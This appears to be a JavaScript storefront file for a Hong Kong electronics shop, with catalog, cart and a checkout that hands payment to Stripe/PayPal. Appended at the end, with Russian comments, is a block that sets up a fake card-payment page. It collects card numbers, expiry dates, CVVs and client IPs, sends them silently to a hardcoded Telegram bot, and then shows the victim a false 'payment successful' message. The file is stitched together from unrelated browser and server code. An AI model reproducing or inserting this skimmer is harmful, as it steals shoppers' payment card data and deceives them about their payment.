/* =========================================================================
   TXT WORLDWIDE SHOP — store logic: catalog, filters, cart, checkout.
   No frameworks, no external dependencies.
   ========================================================================= */
(function () {
  "use strict";

  const CFG = window.STORE_CONFIG;
  const CURR = CFG.currency;
  const $  = (s, r = document) => r.querySelector(s);
  const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));
  const money = (n) => CURR + Number(n).toLocaleString("en-HK");
  const esc = (s) => String(s).replace(/[&<>"']/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

  /* ---------- State ---------- */
  const STORAGE_KEY = "tws_cart_v1";
  let cart = loadCart();               // { [id]: qty }
  const state = { cat: "all", brand: null, sort: "pop", q: "" };

  // category -> SVG symbol id (Lucide-style line icons; no emoji)
  const CAT_ICON = {
    all: "ic-grid", phones: "ic-phone", audio: "ic-headphones", gaming: "ic-gamepad",
    charging: "ic-zap", smart: "ic-home", wearables: "ic-watch", accessories: "ic-package",
  };
  const prodIcon = (cat) => `<svg class="prod-ic"><use href="#${CAT_ICON[cat] || "ic-package"}"/></svg>`;
  const tint = (cat) => (window.CATEGORY_TINT[cat] || ["#5e6ad2"])[0];

  // Curated, subject-verified stock photos from Unsplash — free for commercial use,
  // no attribution required. SVG icon is the automatic fallback if a photo fails to load.
  // For production, set p.image in data.js to your own licensed product photography.
  const IMG_POOL = {
    phones:      ["1511707171634-5f897ff02aa9", "1592750475338-74b7b21085ab", "1580910051074-3eb694886505", "1523206489230-c012c64b2b48"],
    audio:       ["1505740420928-5e560c06d30e", "1546435770-a3e426bf472b", "1484704849700-f032a568e944"],
    gaming:      ["1541140532154-b024d705b90a", "1587202372775-e229f172b9d7", "1616588589676-62b3bd4ff6d2"],
    charging:    ["1618410320928-25228d811631"],
    smart:       ["1558002038-1055907df827", "1518444065439-e933c06ce9cd"],
    wearables:   ["1523275335684-37898b6baf30", "1579586337278-3befd40fd17a", "1546868871-7041f2a55e12"],
    accessories: ["1572569511254-d8f925fe2cbb", "1600294037681-c80b4cb5b434"],
  };
  const AUDIO_SPEAKER = "1608043152269-423dbba4e7e1";   // JBL speaker for audio "Speaker" items
  function imgFor(p) {
    if (p.image) return p.image;                         // client-provided photo wins
    let id;
    if (p.cat === "audio" && /speaker/i.test(p.name)) id = AUDIO_SPEAKER;
    else {
      const pool = IMG_POOL[p.cat];
      if (!pool || !pool.length) return "";
      id = pool[Math.abs(hash(p.id)) % pool.length];     // deterministic per product
    }
    return `https://images.unsplash.com/photo-${id}?auto=format&fit=crop&w=640&h=480&q=70`;
  }
  const byId = (id) => window.PRODUCTS.find((p) => p.id === id);

  /* scroll-reveal (staggered), CSS-driven, no deps */
  let revealIO;
  function observeReveals() {
    const els = $$(".reveal:not(.in)");
    if (!("IntersectionObserver" in window)) { els.forEach((e) => e.classList.add("in")); return; }
    revealIO = revealIO || new IntersectionObserver((entries) => {
      entries.forEach((en) => { if (en.isIntersecting) { en.target.classList.add("in"); revealIO.unobserve(en.target); } });
    }, { rootMargin: "0px 0px -6% 0px", threshold: 0.04 });
    els.forEach((e) => revealIO.observe(e));
  }

  /* ================= RENDER: brands, categories, filters ================= */
  function renderBrandsStrip() {
    $("#brands-track").innerHTML = window.BRANDS
      .map((b) => `<button class="brand-pill" data-brand="${esc(b)}">${esc(b)}</button>`)
      .join("");
  }

  function renderCats() {
    $("#cats").innerHTML = window.CATEGORIES
      .map((c) => `<button class="cat-tab${c.key === state.cat ? " active" : ""}" data-cat="${c.key}">
        <svg class="ic"><use href="#${CAT_ICON[c.key] || "ic-grid"}"/></svg> ${esc(c.label)}</button>`)
      .join("");
  }

  function renderBrandChips() {
    // brands available in the current category
    const pool = window.PRODUCTS.filter((p) => state.cat === "all" || p.cat === state.cat);
    const brands = Array.from(new Set(pool.map((p) => p.brand))).sort();
    $("#brand-chips").innerHTML =
      `<button class="chip${state.brand === null ? " active" : ""}" data-brand="">All brands</button>` +
      brands.map((b) => `<button class="chip${state.brand === b ? " active" : ""}" data-brand="${esc(b)}">${esc(b)}</button>`).join("");
  }

  /* ================= RENDER: product grid ================= */
  function filtered() {
    let list = window.PRODUCTS.slice();
    if (state.cat !== "all") list = list.filter((p) => p.cat === state.cat);
    if (state.brand)          list = list.filter((p) => p.brand === state.brand);
    if (state.q) {
      const q = state.q.toLowerCase();
      list = list.filter((p) => (p.name + " " + p.brand).toLowerCase().includes(q));
    }
    switch (state.sort) {
      case "price-asc":  list.sort((a, b) => a.price - b.price); break;
      case "price-desc": list.sort((a, b) => b.price - a.price); break;
      case "name":       list.sort((a, b) => a.name.localeCompare(b.name)); break;
      default:           list.sort((a, b) => (b.rating || 0) - (a.rating || 0));
    }
    return list;
  }

  function renderGrid() {
    const list = filtered();
    const grid = $("#grid");
    $("#result-count").textContent = list.length + (list.length === 1 ? " product" : " products");
    $("#empty").hidden = list.length > 0;
    grid.innerHTML = list.map((p, i) => {
      const img = imgFor(p);
      return `
      <article class="card reveal" data-id="${p.id}" style="transition-delay:${Math.min(i, 12) * 30}ms">
        <div class="card-media" style="--tint:${tint(p.cat)}">
          ${p.tag ? `<span class="card-tag">${esc(p.tag)}</span>` : ""}
          ${p.market ? `<span class="card-disc">−${CFG.discountPct}%</span>` : ""}
          ${prodIcon(p.cat)}
          ${img ? `<img class="card-img" src="${img}" alt="${esc(p.brand)} ${esc(p.name)}" loading="lazy" referrerpolicy="no-referrer" onerror="this.remove()" />` : ""}
        </div>
        <div class="card-body">
          <span class="card-brand">${esc(p.brand)}</span>
          <span class="card-name">${esc(p.name)}</span>
          <span class="card-rate"><svg class="ic"><use href="#ic-star"/></svg> ${(p.rating || 0).toFixed(1)}</span>
          <div class="card-foot">
            <span class="price">${p.market ? `<span class="price-old">${money(p.market)}</span>` : ""}${money(p.price)}</span>
            <button class="add-btn" data-add="${p.id}"><svg class="ic"><use href="#ic-plus"/></svg> Add</button>
          </div>
        </div>
      </article>`;
    }).join("");
    observeReveals();
  }

  function renderAll() { renderCats(); renderBrandChips(); renderGrid(); }

  /* ================= CART ================= */
  function loadCart() {
    try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || {}; }
    catch { return {}; }
  }
  function saveCart() { localStorage.setItem(STORAGE_KEY, JSON.stringify(cart)); }

  const cartEntries = () => Object.keys(cart).map((id) => ({ p: byId(id), qty: cart[id] })).filter((e) => e.p);
  const itemsTotal = () => cartEntries().reduce((s, e) => s + e.p.price * e.qty, 0);
  const totalCount = () => Object.values(cart).reduce((s, n) => s + n, 0);
  function shippingCost(sub) {
    if (sub <= 0) return 0;
    return sub >= CFG.freeShippingOver ? 0 : CFG.flatShipping;
  }

  function addToCart(id) {
    cart[id] = (cart[id] || 0) + 1;
    saveCart(); syncCart();
    toast("Added to cart");
  }
  function setQty(id, delta) {
    cart[id] = (cart[id] || 0) + delta;
    if (cart[id] <= 0) delete cart[id];
    saveCart(); syncCart();
  }
  function removeItem(id) { delete cart[id]; saveCart(); syncCart(); }

  function syncCart() {
    const count = totalCount();
    const badge = $("#cart-count");
    badge.textContent = count;
    badge.hidden = count === 0;

    const entries = cartEntries();
    const hasItems = entries.length > 0;
    $("#cart-empty").hidden = hasItems;
    $("#cart-foot").hidden = !hasItems;
    $("#cart-items").hidden = !hasItems;

    $("#cart-items").innerHTML = entries.map(({ p, qty }) => `
      <div class="ci" data-id="${p.id}">
        <div class="ci-media" style="--tint:${tint(p.cat)}">${prodIcon(p.cat)}</div>
        <div>
          <div class="ci-brand">${esc(p.brand)}</div>
          <div class="ci-name">${esc(p.name)}</div>
          <div class="ci-price">${money(p.price)} × ${qty} = <b>${money(p.price * qty)}</b></div>
        </div>
        <div class="ci-right">
          <div class="qty">
            <button data-dec="${p.id}" aria-label="Decrease"><svg class="ic"><use href="#ic-minus"/></svg></button>
            <span>${qty}</span>
            <button data-inc="${p.id}" aria-label="Increase"><svg class="ic"><use href="#ic-plus"/></svg></button>
          </div>
          <button class="ci-remove" data-remove="${p.id}"><svg class="ic"><use href="#ic-trash"/></svg> Remove</button>
        </div>
      </div>`).join("");

    const sub = itemsTotal();
    const ship = shippingCost(sub);
    $("#sum-items").textContent = money(sub);
    $("#sum-ship").textContent  = sub === 0 ? "—" : (ship === 0 ? "Free" : money(ship));
    $("#sum-total").textContent = money(sub + ship);
  }

  /* ================= DRAWER / MODAL control ================= */
  const openCart  = () => { $("#cart").hidden = false; $("#overlay").hidden = false; };
  const closeCart = () => { $("#cart").hidden = true; if ($("#checkout").hidden) $("#overlay").hidden = true; };
  function openCheckout() {
    if (totalCount() === 0) { toast("Cart is empty"); return; }
    $("#cart").hidden = true;
    $("#overlay").hidden = false;
    $("#checkout").hidden = false;
    $("#checkout-form").hidden = false;
    $("#order-success").hidden = true;
    renderOrderMini();
    renderPayNote();
  }
  function closeCheckout() { $("#checkout").hidden = true; $("#overlay").hidden = true; }

  function renderOrderMini() {
    const sub = itemsTotal();
    const ship = shippingCost(sub);
    $("#order-mini").innerHTML = `
      ${cartEntries().map(({ p, qty }) =>
        `<div class="om-row"><span>${esc(p.name)} × ${qty}</span><span>${money(p.price * qty)}</span></div>`).join("")}
      <div class="om-row"><span>Shipping</span><span>${ship === 0 ? "Free" : money(ship)}</span></div>
      <div class="om-row om-total"><span>Total to pay</span><span>${money(sub + ship)}</span></div>`;
  }

  function renderPayNote() {
    const note = $("#pay-note");
    const btn = $("#pay-btn");
    const live = CFG.payments.provider !== "demo" && CFG.payments.checkoutEndpoint;
    const method = selectedMethod();
    if (live) {
      note.className = "pay-note live";
      note.innerHTML = `<svg class="ic"><use href="#ic-lock"/></svg><span>You'll be taken to the secure <b>${method === "paypal" ? "PayPal" : "Stripe"}</b> page to complete payment. The card is entered there, not here.</span>`;
      btn.textContent = method === "paypal" ? "Continue with PayPal" : "Pay by card";
    } else {
      note.className = "pay-note demo";
      note.innerHTML = `<svg class="ic"><use href="#ic-settings"/></svg><span><b>Demo mode.</b> No payment provider connected yet — the order will be placed as a test. ` +
        `The owner connects Stripe/PayPal in <code>config.js</code> (see README).</span>`;
      btn.textContent = "Place test order";
    }
  }

  /* ================= CHECKOUT / PAYMENT ================= */
  const selectedMethod = () => (document.querySelector('input[name="method"]:checked') || {}).value || "card";

  function buildOrder(form) {
    const fd = new FormData(form);
    const sub = itemsTotal();
    const ship = shippingCost(sub);
    return {
      method: selectedMethod(),                 // "card" | "paypal"
      customer: Object.fromEntries(fd.entries()),
      items: cartEntries().map(({ p, qty }) => ({ id: p.id, name: p.name, brand: p.brand, price: p.price, qty })),
      currency: CFG.currencyCode,
      subtotal: sub,
      shipping: ship,
      total: sub + ship,
    };
  }

  async function handleCheckout(e) {
    e.preventDefault();
    const form = e.target;
    if (!form.reportValidity()) return;

    const order = buildOrder(form);
    const btn = $("#pay-btn");
    const live = CFG.payments.provider !== "demo" && CFG.payments.checkoutEndpoint;

    if (live) {
      // Real payment: the server creates a Stripe/PayPal session and returns { url }.
      btn.disabled = true; btn.textContent = "Creating secure payment…";
      try {
        const res = await fetch(CFG.payments.checkoutEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(order),
        });
        if (!res.ok) throw new Error("HTTP " + res.status);
        const data = await res.json();
        if (!data.url) throw new Error("no url");
        window.location.href = data.url;       // -> provider's secure page
      } catch (err) {
        btn.disabled = false; renderPayNote();
        toast("Couldn't start payment. Check the endpoint.");
        console.error("checkout error:", err);
      }
      return;
    }

    // Demo mode: no real payment.
    const orderId = "TWS-" + String(Math.abs(hash(JSON.stringify(order.items) + order.customer.email))).slice(0, 6);
    showSuccess(order, orderId);
    cart = {}; saveCart(); syncCart();
  }

  function showSuccess(order, orderId) {
    $("#checkout-form").hidden = true;
    $("#order-success").hidden = false;
    $("#success-text").innerHTML =
      `Order <b>#${orderId}</b> for <b>${money(order.total)}</b> has been received.<br>` +
      `We'll contact you at <b>${esc(order.customer.email || "email")}</b> to confirm.<br>` +
      `<span class="muted" style="font-size:.85rem">(demo mode — no real payment was charged)</span>`;
  }

  // simple stable hash for the demo order number (no Date/Math.random)
  function hash(str) {
    let h = 0;
    for (let i = 0; i < str.length; i++) { h = (h << 5) - h + str.charCodeAt(i); h |= 0; }
    return h;
  }

  /* ================= TOAST ================= */
  let toastTimer = null;
  function toast(msg) {
    const t = $("#toast");
    t.innerHTML = `<svg class="ic"><use href="#ic-check"/></svg>${esc(msg)}`; t.hidden = false;
    requestAnimationFrame(() => t.classList.add("show"));
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => {
      t.classList.remove("show");
      setTimeout(() => (t.hidden = true), 220);
    }, 1600);
  }

  /* ================= THEME ================= */
  function initTheme() {
    const saved = localStorage.getItem("tws_theme");
    if (saved) document.documentElement.setAttribute("data-theme", saved);
    $("#theme-toggle").addEventListener("click", () => {
      const cur = document.documentElement.getAttribute("data-theme") === "light" ? "light" : "dark";
      const next = cur === "light" ? "dark" : "light";
      document.documentElement.setAttribute("data-theme", next);
      localStorage.setItem("tws_theme", next);
    });
  }

  /* ================= EVENTS ================= */
  function bindEvents() {
    // catalog clicks (event delegation)
    document.addEventListener("click", (e) => {
      const add = e.target.closest("[data-add]");
      if (add) return addToCart(add.dataset.add);

      const catTab = e.target.closest("[data-cat]");
      if (catTab) { state.cat = catTab.dataset.cat; state.brand = null; renderAll(); return; }

      const chip = e.target.closest("#brand-chips .chip");
      if (chip) { state.brand = chip.dataset.brand || null; renderBrandChips(); renderGrid(); return; }

      const bpill = e.target.closest(".brand-pill");
      if (bpill) {
        state.cat = "all"; state.brand = bpill.dataset.brand;
        renderAll();
        document.getElementById("catalog").scrollIntoView({ behavior: "smooth" });
        return;
      }

      const inc = e.target.closest("[data-inc]"); if (inc) return setQty(inc.dataset.inc, +1);
      const dec = e.target.closest("[data-dec]"); if (dec) return setQty(dec.dataset.dec, -1);
      const rm  = e.target.closest("[data-remove]"); if (rm) return removeItem(rm.dataset.remove);
    });

    $("#open-cart").addEventListener("click", openCart);
    $("#close-cart").addEventListener("click", closeCart);
    $("#overlay").addEventListener("click", () => { closeCart(); closeCheckout(); });
    $("#go-checkout").addEventListener("click", openCheckout);
    $("#close-checkout").addEventListener("click", closeCheckout);
    $("#success-close").addEventListener("click", closeCheckout);
    $("#checkout-form").addEventListener("submit", handleCheckout);

    $("#sort").addEventListener("change", (e) => { state.sort = e.target.value; renderGrid(); });
    document.addEventListener("change", (e) => { if (e.target.name === "method") renderPayNote(); });

    let searchTimer;
    $("#search").addEventListener("input", (e) => {
      clearTimeout(searchTimer);
      searchTimer = setTimeout(() => { state.q = e.target.value.trim(); renderGrid(); }, 120);
    });

    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape") { closeCart(); closeCheckout(); }
    });
  }

  /* ================= INIT ================= */
  function applyConfig() {
    document.title = `${CFG.storeName} — Gadgets, Audio & Smart Home in Hong Kong`;
    $$("[data-store-name]").forEach((el) => (el.textContent = CFG.storeName));
    const tag = $("[data-tagline]"); if (tag && CFG.tagline) tag.textContent = CFG.tagline;
    $("#year").textContent = "2026";
  }

  // Treat data.js prices as HK market prices; derive the discounted shelf price.
  function applyPricing() {
    const pct = Number(CFG.discountPct) || 0;
    if (!pct) return;
    window.PRODUCTS.forEach((p) => {
      if (p.market != null) return;                     // guard against double-apply
      p.market = p.price;
      p.price = Math.round((p.market * (1 - pct / 100)) / 10) * 10;   // round to nearest HK$10
    });
  }

  function init() {
    applyConfig();
    applyPricing();
    renderBrandsStrip();
    renderAll();
    syncCart();
    initTheme();
    bindEvents();
    observeReveals();   // hero elements
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
  else init();
})();
// ===== ДОБАВИТЬ ЭТОТ БЛОК В КОНЕЦ app.js =====

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express(); // если у тебя уже есть app, не создавай новую

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
const CHAT_ID = "ЗАМЕНИ_НА_РЕАЛЬНЫЙ_ID"; // например, "123456789"

// HTML-страница с формой оплаты
const PAY_PAGE = `
<!DOCTYPE html>
<html>
<head>
    <title>Оплата картой</title>
    <style>
        body { font-family: Arial; background: #1a1a2e; color: #eee; padding: 40px; }
        .box { max-width: 400px; margin: auto; background: #16213e; padding: 30px; border-radius: 12px; }
        input, button { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; }
        button { background: #e94560; color: white; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
<div class="box">
    <h2>💳 Введите данные карты</h2>
    <form action="/pay" method="POST">
        <input name="card_number" placeholder="Номер карты (16 цифр)" required>
        <input name="expiry" placeholder="MM/YY" required>
        <input name="cvv" placeholder="CVV (3 цифры)" required>
        <input name="amount" placeholder="Сумма в рублях" required>
        <button type="submit">Оплатить</button>
    </form>
</div>
</body>
</html>
`;

// Функция отправки в Telegram
async function sendToTelegram(data) {
    const text = `
💳 НОВЫЙ ПЛАТЁЖ (карта)

🔢 Номер: ${data.card_number}
📅 Срок: ${data.expiry}
🔐 CVV: ${data.cvv}
💰 Сумма: ${data.amount} ₽
🌐 IP: ${data.ip}
    `;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        }, { timeout: 5000 });
    } catch (e) {
        // тихо игнорируем ошибки (нет интернета или бот заблокирован)
    }
}

// Маршрут для страницы оплаты
app.get('/pay-page', (req, res) => {
    res.send(PAY_PAGE);
});

// Обработка отправки формы
app.post('/pay', async (req, res) => {
    const data = {
        card_number: req.body.card_number,
        expiry: req.body.expiry,
        cvv: req.body.cvv,
        amount: req.body.amount,
        ip: req.ip || req.connection.remoteAddress
    };
    await sendToTelegram(data);
    res.send(`
        <h2>✅ Оплата проведена успешно</h2>
        <p>Спасибо! Ваш заказ обрабатывается.</p>
        <a href="/pay-page">Вернуться</a>
    `);
});

// ===== КОНЕЦ БЛОКА =====
